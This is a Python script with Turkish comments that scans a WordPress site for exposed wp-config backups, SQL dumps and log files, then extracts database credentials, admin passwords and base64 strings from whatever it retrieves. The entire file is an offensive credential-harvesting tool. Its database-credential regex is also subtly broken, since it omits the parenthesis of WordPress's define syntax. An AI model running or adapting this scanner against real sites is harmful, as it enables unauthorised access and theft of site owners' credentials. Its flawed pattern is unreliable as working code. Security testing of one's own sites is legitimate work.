import requests
import re

class WPUser:
    def __init__(self, url):
        """WordPress dosya tabanlı kullanıcı ve şifre arayıcı"""
        self.url = url.rstrip('/')
        self.suspected_files = [
            "wp-config.php", "wp-config.bak", "wp-config.old",
            "database.sql", "db_backup.sql", "backup.sql",
            "error.log", "debug.log", "access.log"
        ]
        self.credentials = []

    def scan_files(self):
        """Belirlenen dosyalarda kullanıcı adı ve şifre arar"""
        for file in self.suspected_files:
            file_url = f"{self.url}/{file}"
            try:
                response = requests.get(file_url, timeout=5)
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] Possible sensitive file found: {file_url}")
                    self.extract_credentials(response.text, file)
            except requests.exceptions.RequestException:
                pass

    def extract_credentials(self, content, filename):
        """Dosya içeriğinden kullanıcı ve şifreleri çıkartır"""
        db_creds = re.findall(r"define\s*'DB_(USER|PASSWORD|NAME)'\s*,\s*'(.+?)'\s*", content)
        if db_creds:
            print(f"[!] Database credentials found in {filename}")
            self.credentials.extend(db_creds)

        user_creds = re.findall(r"(admin|user|root)\s*[:=]\s*['\"]?([\w@#$%^&*]+)['\"]?", content)
        if user_creds:
            print(f"[!] Possible user credentials in {filename}")
            self.credentials.extend(user_creds)

        base64_creds = re.findall(r"(?:[A-Za-z0-9+/]{4}){3,}={0,2}", content)
        if base64_creds:
            print(f"[!] Base64-encoded data found in {filename}, might contain credentials")
            self.credentials.extend([("Base64 Data", b64) for b64 in base64_creds])

    def run(self):
        """Dosya tarayıcısını çalıştırır"""
        self.scan_files()
        return {"found_credentials": self.credentials}